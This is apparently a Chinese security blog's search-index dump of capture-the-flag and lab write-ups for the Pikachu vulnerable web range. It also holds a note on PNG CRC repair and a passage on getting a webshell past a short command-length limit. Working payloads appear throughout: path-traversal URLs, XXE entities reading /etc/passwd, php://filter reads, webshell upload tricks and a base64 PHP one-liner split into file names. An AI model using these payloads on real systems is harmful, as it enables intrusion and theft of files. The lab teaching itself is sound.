header(\"location:op2_login.php\"); } 3.来到添加用户的页面,可以看到，相比于管理员页面的校验，此处缺少了对权限等级的校验，于是产生了越权。 $link=connect(); // 判断是否登录，没有登录不能访问 //这里只是验证了登录状态，并没有验证级别，所以存在越权问题。 if(!check_op2_login($link)){ header(\"location:op2_login.php\"); exit(); } if(isset($_POST['submit'])){ if($_POST['username']!=null \u0026\u0026 $_POST['password']!=null){//用户名密码必填 $getdata=escape($link, $_POST);//转义 $query=\"insert into member(username,pw,sex,phonenum,email,address) values('{$getdata['username']}',md5('{$getdata['password']}'),'{$getdata['sex']}','{$getdata['phonenum']}','{$getdata['email']}','{$getdata['address']}')\"; $result=execute($link, $query); if(mysqli_affected_rows($link)==1){//判断是否插入 header(\"location:op2_admin.php\"); }else { $html.=\"\u003cp\u003e修改失败,请检查下数据库是不是还是活着的\u003c/p\u003e\"; } } } if(isset($_GET['logout']) \u0026\u0026 $_GET['logout'] == 1){ session_unset(); session_destroy(); setcookie(session_name(),'',time()-3600,'/'); header(\"location:op2_login.php\"); } ------------------------------------------------------------------------------------------------------------------------------------------ //此处涉及到校验是否登录的函数。 function check_op2_login($link){ if(isset($_SESSION['op2']['username']) \u0026\u0026 isset($_SESSION['op2']['password'])){ $query=\"select * from users where username='{$_SESSION['op2']['username']}' and sha1(password)='{$_SESSION['op2']['password']}'\"; $result=execute($link,$query); if(mysqli_num_rows($result)==1){ return true; }else{ return false; } }else{ return false; } } ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:2","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#垂直越权"},{"categories":["web","wp"],"content":"\rPath-traversal​ 在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。 从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#path-traversal"},{"categories":["web","wp"],"content":"\r目录遍历任意输入一个title值，爆出当前目录 随后对url中的payload进行修改即可实现目录遍历 例如： http://127.0.0.1/vul/dir/dir_list.php?title=../../../README.md ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#目录遍历"},{"categories":["web","wp"],"content":"\rRemote Commandcode Execute​ RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。 ​ 分为远程代码执行和远程系统命令执行 远程系统命令执行 一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上 一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器 远程代码执行 同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#remote-commandcode-execute"},{"categories":["web","wp"],"content":"\rexec\"ping\"查看rce_ping源码文件, 可发现$_POST['ipaddress']变量未经任何安全处理就传给了$ip, 由此造成了远程命令执行漏洞 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#execping"},{"categories":["web","wp"],"content":"\rexec “eval”查看源码可知，$POST['txt']未经任何过滤处理就作为eval函数的参数, 由此造成远程代码执行漏洞 输入phpinfo();,得到回显 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:2","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#exec-eval"},{"categories":["web","wp"],"content":"\rServer-Side Request Forgery​ 服务器端请求伪造,其形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制,导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据 ​ 数据流:攻击者—–\u003e服务器—-\u003e目标地址 PHP中下面函数的使用不当会导致SSRF: file_get_contents() fsockopen() curl_exec() ​ 如果一定要通过后台服务器远程去对用户指定(“或者预埋在前端的请求”)的地址进行资源请求,则请做好目标地址的过滤。 ​ 查看一下源代码：\r源码中阐述了：curl支持很多协议，比如FTP,FTPS,HTTP,HTTPS,GOPHER,TELNET,DICT,FILE等协议 我本地环境里的ssrf打不开了，这里摘取charmersix的笔记： 我们也可以效仿上上个漏洞,通过file协议读取一些我们想要的文件 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#server-side-request-forgery"},{"categories":["web","wp"],"content":"\rSSRF(file_get_contents)​ file_get_contents() 函数是PHP中用于读取文件内容的内置函数之一。它以字符串形式返回指定文件的全部内容。 ​ 我的本地环境报了个奇怪的错误，这里先引用一下Henry404s师傅的笔记： ​ file_get_contents() 把整个文件读入一个字符串中。 //读取PHP文件的源码:php://filter/read=convert.base64-encode/resource=ssrf.php //内网请求:http://x.x.x.x/xx.index if(isset($_GET['file']) \u0026\u0026 $_GET['file'] !=null){ $filename = $_GET['file']; $str = file_get_contents($filename); echo $str; } ​ 由于使用的函数不一样了，利用方法也就不同了，这里，探测端口似乎不再灵验，但是依然可以实现文件的读取 http://192.168.1.101/pikachu/vul/ssrf/ssrf_fgc.php ?file=file:///C:/Windows/System32/drivers/etc/hosts 可以发起内网请求，而不必跳转到另一个服务器，而使用curl则需要跳转 除此之外，还可以读取出网页源码，直接使用本题提供的payload ?file=php://filter/read=convert.base64-encode/resource=ssrf.php 另外，这位师傅还总结了php中file_get_contents与curl的区别： 1.curl支持更多功能 curl支持更多协议，有http、https、ftp、gopher、telnet、dict、file、ldap;模拟Cookie登录，爬取网页;FTP上传下载。fopen / file_get_contents只能使用GET方式获取数据。 2.性能 curl可以进行DNS缓存，同一个域名下的图片或其它资源只需要进行一次DNS查询。 curl相对来说更加快速稳定，访问量高的时候首选curl，缺点就是相对于file_get_contents配置繁琐一点，file_get_contents 适用与处理小访问的应用。 ———————————————— https://blog.csdn.net/weixin_44178492/article/details/108959980 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#ssrffile_get_contents"},{"categories":["web","wp"],"content":"\rUnsafe Filedownload不安全的文件下载 ​ 文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。 ​ 如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。 ​ 查看文件源代码，可知下载提取的目录文件夹是download，通过抓包我们可对get方式传输的payload进行修改，改为： http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=../../../../index.html 这样就下载到了非预期文件 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#unsafe-filedownload"},{"categories":["web","wp"],"content":"\rUnsafe Upfileupload不安全的文件上传漏洞 ​ 比如很多网站注册的时候需要上传头像、上传附件等等。当用户点击上传按钮后，后台会对上传的文件进行判断 比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。 如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被webshell。 ​ 在设计文件上传功能时，要对传进来的文件进行严格的安全考虑。比如： –验证文件类型、后缀名、大小; –验证文件的上传方式; –对文件进行一定复杂的重命名; –不要暴露文件上传后的路径; –等等… ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#unsafe-upfileupload"},{"categories":["web","wp"],"content":"\rClient Check无法上传php文件， 通过查看源码，可发现，有前端script验证，只允许上传jpg，png，gif扩展名的文件 方法一：上传一个jpg后缀的一句话木马，在bp中抓包，并对文件后缀进行修改\r将此处改为a.php即可，随后蚁剑连接 方法二：浏览器禁用JavaScript\r(Chrome浏览器可以使用JavaScript Switch插件一键禁用) ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#client-check"},{"categories":["web","wp"],"content":"\rClient Check无法上传php文件， 通过查看源码，可发现，有前端script验证，只允许上传jpg，png，gif扩展名的文件 方法一：上传一个jpg后缀的一句话木马，在bp中抓包，并对文件后缀进行修改\r将此处改为a.php即可，随后蚁剑连接 方法二：浏览器禁用JavaScript\r(Chrome浏览器可以使用JavaScript Switch插件一键禁用) ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#方法一上传一个jpg后缀的一句话木马在bp中抓包并对文件后缀进行修改"},{"categories":["web","wp"],"content":"\rClient Check无法上传php文件， 通过查看源码，可发现，有前端script验证，只允许上传jpg，png，gif扩展名的文件 方法一：上传一个jpg后缀的一句话木马，在bp中抓包，并对文件后缀进行修改\r将此处改为a.php即可，随后蚁剑连接 方法二：浏览器禁用JavaScript\r(Chrome浏览器可以使用JavaScript Switch插件一键禁用) ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#方法二浏览器禁用javascript"},{"categories":["web","wp"],"content":"\rMIME type查看源代码，可知MIME是通过判断你的文件类型(而不是后缀名)来决定是否允许你上传文件，只需抓包修改content_type值就能绕过验证 改为 Content-Type: image/jpeg ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:2","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#mime-type"},{"categories":["web","wp"],"content":"\rgetimagesize()验证getimagesize()函数会通过读取文件头部的几个字符串(即文件头), 来判断是否为正常图片的头部 可通过制作图片木马或再木马文件内容头部添加GIF89a(Gif图片文件头), 然后利用文件包含漏洞来解析图片木马 当然也可以直接在一张真正的图片后面插入一句话木马 传入jpg一句话木马，我们再通过文件包含，将jpg进行php渲染，便可以通过蚁剑来连接 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:1:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#getimagesize验证"},{"categories":["web","wp"],"content":"\rPHP-Unserialize 在理解这个漏洞前,你需要先搞清楚php中serialize()，unserialize()这两个函数。 ​ 于是我向ChatGPT发问 序列化serialize()说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象: class S{ public $test=\"pikachu\"; } $s=new S(); //创建一个对象 serialize($s); //把这个对象进行序列化 序列化后得到的结果是这个样子的:O:1:\"S\":1:{s:4:\"test\";s:7:\"pikachu\";}\rO:代表object\r1:代表对象名字长度为一个字符\rS:对象的名称\r1:代表对象里面有一个变量\rs:数据类型\r4:变量名称的长度\rtest:变量名称\rs:数据类型\r7:变量值的长度\rpikachu:变量值\r反序列化unserialize()​ 就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。 $u=unserialize(\"O:1:\"S\":1:{s:4:\"test\";s:7:\"pikachu\";}\"); echo $u-\u003etest; //得到的结果为pikachu ​ 序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题 如下所示为常见的魔法函数: __construct(): 当一个对象创建时被调用 __destruct(): 当一个对象销毁时被调用 __toString(): 当一个对象被当做一个字符串使用 __sleep(): 在对象被序列化之前执行 __wakeup(): 在序列化之后立即被调用 漏洞举例: class S{ var $test = \"pikachu\"; function __destruct(){ echo $this-\u003etest; } } $s = $_GET['test']; @$unser = unserialize($a); payload:O:1:\"S\":1:{s:4:\"test\";s:29:\"\u003cscript\u003ealert('xss')\u003c/script\u003e\";} 查看一下源码： 根据提示用题中给出的payload，实现了xss攻击。(是一个xss的反序列化) O:1:\"S\":1:{s:4:\"test\";s:29:\"\u003cscript\u003ealert('xss')\u003c/script\u003e\";} ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#php-unserialize"},{"categories":["web","wp"],"content":"\rPHP-Unserialize 在理解这个漏洞前,你需要先搞清楚php中serialize()，unserialize()这两个函数。 ​ 于是我向ChatGPT发问 序列化serialize()说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象: class S{ public $test=\"pikachu\"; } $s=new S(); //创建一个对象 serialize($s); //把这个对象进行序列化 序列化后得到的结果是这个样子的:O:1:\"S\":1:{s:4:\"test\";s:7:\"pikachu\";}\rO:代表object\r1:代表对象名字长度为一个字符\rS:对象的名称\r1:代表对象里面有一个变量\rs:数据类型\r4:变量名称的长度\rtest:变量名称\rs:数据类型\r7:变量值的长度\rpikachu:变量值\r反序列化unserialize()​ 就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。 $u=unserialize(\"O:1:\"S\":1:{s:4:\"test\";s:7:\"pikachu\";}\"); echo $u-\u003etest; //得到的结果为pikachu ​ 序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题 如下所示为常见的魔法函数: __construct(): 当一个对象创建时被调用 __destruct(): 当一个对象销毁时被调用 __toString(): 当一个对象被当做一个字符串使用 __sleep(): 在对象被序列化之前执行 __wakeup(): 在序列化之后立即被调用 漏洞举例: class S{ var $test = \"pikachu\"; function __destruct(){ echo $this-\u003etest; } } $s = $_GET['test']; @$unser = unserialize($a); payload:O:1:\"S\":1:{s:4:\"test\";s:29:\"\";} 查看一下源码： 根据提示用题中给出的payload，实现了xss攻击。(是一个xss的反序列化) O:1:\"S\":1:{s:4:\"test\";s:29:\"\";} ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#序列化serialize"},{"categories":["web","wp"],"content":"\rPHP-Unserialize 在理解这个漏洞前,你需要先搞清楚php中serialize()，unserialize()这两个函数。 ​ 于是我向ChatGPT发问 序列化serialize()说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象: class S{ public $test=\"pikachu\"; } $s=new S(); //创建一个对象 serialize($s); //把这个对象进行序列化 序列化后得到的结果是这个样子的:O:1:\"S\":1:{s:4:\"test\";s:7:\"pikachu\";}\rO:代表object\r1:代表对象名字长度为一个字符\rS:对象的名称\r1:代表对象里面有一个变量\rs:数据类型\r4:变量名称的长度\rtest:变量名称\rs:数据类型\r7:变量值的长度\rpikachu:变量值\r反序列化unserialize()​ 就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。 $u=unserialize(\"O:1:\"S\":1:{s:4:\"test\";s:7:\"pikachu\";}\"); echo $u-\u003etest; //得到的结果为pikachu ​ 序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题 如下所示为常见的魔法函数: __construct(): 当一个对象创建时被调用 __destruct(): 当一个对象销毁时被调用 __toString(): 当一个对象被当做一个字符串使用 __sleep(): 在对象被序列化之前执行 __wakeup(): 在序列化之后立即被调用 漏洞举例: class S{ var $test = \"pikachu\"; function __destruct(){ echo $this-\u003etest; } } $s = $_GET['test']; @$unser = unserialize($a); payload:O:1:\"S\":1:{s:4:\"test\";s:29:\"\";} 查看一下源码： 根据提示用题中给出的payload，实现了xss攻击。(是一个xss的反序列化) O:1:\"S\":1:{s:4:\"test\";s:29:\"\";} ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#反序列化unserialize"},{"categories":["web","wp"],"content":"\rPHP-Unserialize 在理解这个漏洞前,你需要先搞清楚php中serialize()，unserialize()这两个函数。 ​ 于是我向ChatGPT发问 序列化serialize()说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象: class S{ public $test=\"pikachu\"; } $s=new S(); //创建一个对象 serialize($s); //把这个对象进行序列化 序列化后得到的结果是这个样子的:O:1:\"S\":1:{s:4:\"test\";s:7:\"pikachu\";}\rO:代表object\r1:代表对象名字长度为一个字符\rS:对象的名称\r1:代表对象里面有一个变量\rs:数据类型\r4:变量名称的长度\rtest:变量名称\rs:数据类型\r7:变量值的长度\rpikachu:变量值\r反序列化unserialize()​ 就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。 $u=unserialize(\"O:1:\"S\":1:{s:4:\"test\";s:7:\"pikachu\";}\"); echo $u-\u003etest; //得到的结果为pikachu ​ 序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题 如下所示为常见的魔法函数: __construct(): 当一个对象创建时被调用 __destruct(): 当一个对象销毁时被调用 __toString(): 当一个对象被当做一个字符串使用 __sleep(): 在对象被序列化之前执行 __wakeup(): 在序列化之后立即被调用 漏洞举例: class S{ var $test = \"pikachu\"; function __destruct(){ echo $this-\u003etest; } } $s = $_GET['test']; @$unser = unserialize($a); payload:O:1:\"S\":1:{s:4:\"test\";s:29:\"\";} 查看一下源码： 根据提示用题中给出的payload，实现了xss攻击。(是一个xss的反序列化) O:1:\"S\":1:{s:4:\"test\";s:29:\"\";} ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#如下所示为常见的魔法函数"},{"categories":["web","wp"],"content":"\rUrl Redirect​ 不安全的url跳转问题可能发生在一切执行了url地址跳转的地方。 ​ 如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页面的url地址)参数作为了跳转的目的地,而又没有做判断的话就可能发生\"跳错对象\"的问题。 ​ url跳转比较直接的危害是: –\u003e钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站 注意查看每个超链接的具体内容： 尝试跳转至我的博客： 成功跳转： ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#url-redirect"},{"categories":["web","wp"],"content":"\rxml external entity injection​ xml外部实体注入漏洞 ​ 攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题。也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。 ​ 在现在很多语言里用于解析xml的函数, 默认禁止解析外部实体内容, 从而就避免了此漏洞。以PHP为例, 在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的 ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:0","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#xml-external-entity-injection"},{"categories":["web","wp"],"content":"\r先补一下基础知识：","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:1","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#先补一下基础知识"},{"categories":["web","wp"],"content":"\rjoker0xxx3师傅的笔记 第一部分：XML声明部分 \u003c?xml version=\"1.0\"?\u003e 第二部分：文档类型定义 DTD \u003c!DOCTYPE note[ \u003c!--定义此文档是note类型的文档--\u003e \u003c!ENTITY entity-name SYSTEM \"URI/URL\"\u003e \u003c!--外部实体声明--\u003e ]\u003e ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:2","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#返回主页httpswwwcnblogscomskinscustomimageslogogifhttpswwwcnblogscomjoker-vipjoker0xxx3httpswwwcnblogscomjoker-vip师傅的笔记"},{"categories":["web","wp"],"content":"\rjoker0xxx3师傅的笔记 第一部分：XML声明部分 \u003c?xml version=\"1.0\"?\u003e 第二部分：文档类型定义 DTD \u003c!DOCTYPE note[ \u003c!ENTITY entity-name SYSTEM \"URI/URL\"\u003e ]\u003e ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:2","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#第一部分xml声明部分"},{"categories":["web","wp"],"content":"\rjoker0xxx3师傅的笔记 第一部分：XML声明部分 \u003c?xml version=\"1.0\"?\u003e 第二部分：文档类型定义 DTD \u003c!DOCTYPE note[ \u003c!ENTITY entity-name SYSTEM \"URI/URL\"\u003e ]\u003e ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:2","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#第二部分文档类型定义-dtd"},{"categories":["web","wp"],"content":"\r第三部分：文档元素 \u003cnote\u003e \u003cto\u003eDave\u003c/to\u003e \u003cfrom\u003eTom\u003c/from\u003e \u003chead\u003eReminder\u003c/head\u003e \u003cbody\u003eYou are a good man\u003c/body\u003e \u003c/note\u003e ​ 其中，DTD（Document Type Definition，文档类型定义），用来为 XML 文档定义语法约束，可以是内部申明也可以使引用外部DTD。现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的，从而也就直接避免了这个漏洞。 ① 内部申明DTD格式\u003c!DOCTYPE 根元素 [元素申明]\u003e ② 外部引用DTD格式\u003c!DOCTYPE 根元素 SYSTEM \"外部DTD的URI\"\u003e ③ 引用公共DTD格式\u003c!DOCTYPE 根元素 PUBLIC \"DTD标识名\" \"公共DTD的URI\"\u003e 外部实体引用 Payload \u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE ANY[ \u003c!ENTITY f SYSTEM \"file:///etc/passwd\"\u003e ]\u003e \u003cx\u003e\u0026f;\u003c/x\u003e 本题目是默认开启了LIBXML_NOENT 如果删掉LIBXML_NOENT则无法解析外部实体内容 xml外部引用支持file协议, 以及http, ftp等协议 我们通过构造一下代码，来读取网站根目录的相关文件 \u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE ANY[ \u003c!ENTITY f SYSTEM \"file:///c:/windows/system.ini\"\u003e ]\u003e \u003cx\u003e\u0026f;\u003c/x\u003e ","date":"2023-11-17","objectID":"/pikachu_range_summary/:0:3","series":null,"tags":["web","wp"],"title":"Pikachu靶场汇总","uri":"/pikachu_range_summary/#第三部分文档元素"},{"categories":["misc","notes"],"content":"一点png的基础和pngCRC 基础：用010editor打开该png分析其字节信息 前八个字节89 50 4E 47 0D 0A 1A 0A为png的文件头，该段格式是固定的 chunk[0]段：◎从文件头往后，四个字节00 00 00 0D（即为十进制的13）代表数据块的长度为13，数据块包含了png图片的宽高等信息，该段格式是固定的 ◎之后的四个字节****49 48 44 52（即为ASCII码的IHDR）是文件头数据块的标示，该段格式也是固定的 ◎之后进入13位数据块，前8个字节00 00 05 A0 00 00 03 84中： 前四个字节00 00 05 A0（即为十进制的1366），代表该图片的宽，该段数据是由图片的实际宽决定的 后四个字节00 00 03 84（即为十进制的900），代表该图片的高，该段数据是由图片的实际高度决定的 这8个字节都属于13位数据块的内容，因此数据块应再向后数5个字节，即为00 00 05 A0 00 00 03 84 08 02 00 00 00 剩余的4位D8 2F 01 85为该png的CRC检验码，该段数据是由IDCH以及十三位数据块（即上文中的49 48 44 52 00 00 05 A0 00 00 03 84 08 02 00 00 00）计算得到的 绿色部分是IHDR数据, 里面的00 00 01 f4是宽, 00 00 01 af是高，红色部分是CRC32, 是根据绿色部分算出来的 有了之上的基础知识，再来看大部分png中CRC检验错误的出题思路： 对一张正常的图片，通过修改其宽度或者高度隐藏信息，使计算出的CRC校验码与原图的CRC校验码不一致；windows的图片查看器会忽略错误的CRC校验码，因此会显示图片，但此时的图片已经是修改过的，所以会有显示不全或扭曲等情况，借此可以隐藏信息。 而Linux下的图片查看器不会忽略错误的CRC校验码，因此用Linux打开修改过宽或高的png图片时，会出现打不开的情况 网上的CRC修正python脚本： import binascii import struct import sys file = input(\"图片地址：\") fr = open(file,'rb').read() data = bytearray(fr[0x0c:0x1d]) crc32key = eval('0x'+str(binascii.b2a_hex(fr[0x1d:0x21]))[2:-1]) #原来的代码: crc32key = eval(str(fr[29:33]).replace('\\\\x','').replace(\"b'\",'0x').replace(\"'\",'')) n = 4095 for w in range(n): width = bytearray(struct.pack('\u003ei', w)) for h in range(n): height = bytearray(struct.pack('\u003ei', h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] crc32result = binascii.crc32(data) \u0026 0xffffffff if crc32result == crc32key: print(width,height) newpic = bytearray(fr) for x in range(4): newpic[x+16] = width[x] newpic[x+20] = height[x] fw = open(file+'.png','wb') fw.write(newpic) fw.close sys.exit() 为方便起见，.py文件最好和png文件处在同一文件夹 ","date":"2023-11-17","objectID":"/pngcrc/:0:0","series":null,"tags":["misc","notes"],"title":"pngCRC","uri":"/pngcrc/#"},{"categories":["misc","notes"],"content":"一点png的基础和pngCRC 基础：用010editor打开该png分析其字节信息 前八个字节89 50 4E 47 0D 0A 1A 0A为png的文件头，该段格式是固定的 chunk[0]段：◎从文件头往后，四个字节00 00 00 0D（即为十进制的13）代表数据块的长度为13，数据块包含了png图片的宽高等信息，该段格式是固定的 ◎之后的四个字节****49 48 44 52（即为ASCII码的IHDR）是文件头数据块的标示，该段格式也是固定的 ◎之后进入13位数据块，前8个字节00 00 05 A0 00 00 03 84中： 前四个字节00 00 05 A0（即为十进制的1366），代表该图片的宽，该段数据是由图片的实际宽决定的 后四个字节00 00 03 84（即为十进制的900），代表该图片的高，该段数据是由图片的实际高度决定的 这8个字节都属于13位数据块的内容，因此数据块应再向后数5个字节，即为00 00 05 A0 00 00 03 84 08 02 00 00 00 剩余的4位D8 2F 01 85为该png的CRC检验码，该段数据是由IDCH以及十三位数据块（即上文中的49 48 44 52 00 00 05 A0 00 00 03 84 08 02 00 00 00）计算得到的 绿色部分是IHDR数据, 里面的00 00 01 f4是宽, 00 00 01 af是高，红色部分是CRC32, 是根据绿色部分算出来的 有了之上的基础知识，再来看大部分png中CRC检验错误的出题思路： 对一张正常的图片，通过修改其宽度或者高度隐藏信息，使计算出的CRC校验码与原图的CRC校验码不一致；windows的图片查看器会忽略错误的CRC校验码，因此会显示图片，但此时的图片已经是修改过的，所以会有显示不全或扭曲等情况，借此可以隐藏信息。 而Linux下的图片查看器不会忽略错误的CRC校验码，因此用Linux打开修改过宽或高的png图片时，会出现打不开的情况 网上的CRC修正python脚本： import binascii import struct import sys file = input(\"图片地址：\") fr = open(file,'rb').read() data = bytearray(fr[0x0c:0x1d]) crc32key = eval('0x'+str(binascii.b2a_hex(fr[0x1d:0x21]))[2:-1]) #原来的代码: crc32key = eval(str(fr[29:33]).replace('\\\\x','').replace(\"b'\",'0x').replace(\"'\",'')) n = 4095 for w in range(n): width = bytearray(struct.pack('\u003ei', w)) for h in range(n): height = bytearray(struct.pack('\u003ei', h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] crc32result = binascii.crc32(data) \u0026 0xffffffff if crc32result == crc32key: print(width,height) newpic = bytearray(fr) for x in range(4): newpic[x+16] = width[x] newpic[x+20] = height[x] fw = open(file+'.png','wb') fw.write(newpic) fw.close sys.exit() 为方便起见，.py文件最好和png文件处在同一文件夹 ","date":"2023-11-17","objectID":"/pngcrc/:0:0","series":null,"tags":["misc","notes"],"title":"pngCRC","uri":"/pngcrc/#chunk0段"},{"categories":["web","manual"],"content":"进阶版rce_payload ","date":"2023-11-17","objectID":"/rce_advanced/:0:0","series":null,"tags":["web","manual"],"title":"rce_进阶","uri":"/rce_advanced/#"},{"categories":["web","manual"],"content":"\r字符数量限制bypass题目限制了命令的长度，只能7个字符。 \u003c?php $sandbox = dirname(__FILE__).'/sandbox_' . md5(\"orange\" . $_SERVER['REMOTE_ADDR']); mkdir($sandbox,0755,true); chdir($sandbox); if (isset($_GET['cmd']) \u0026\u0026 strlen($_GET['cmd']) \u003c= 7) { @exec($_GET['cmd']); } else if (isset($_GET['reset'])) { @exec('/bin/rm -rf ' . $sandbox); } highlight_file(__FILE__); ?\u003e 我们可以利用Linux命令特性，来写入一句话木马 每次提交不超过7个字符的命令，写入一句话木马的执行语句到文件名，然后通过sh a ls -t，利用文件名组成写入一句话木马的命令 要写入的一句话木马： \u003c?php eval($_GET[1]); base64编码后: PD9waHAgZXZhbCgkX0dFVFsxXSk7 最终需要被执行的语句： echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d\u003e1.php 然后将语句分拆，输出为文件名： \u003ehp \u003e1.p\\\\ \u003ed\\\u003e\\\\ \u003e\\ 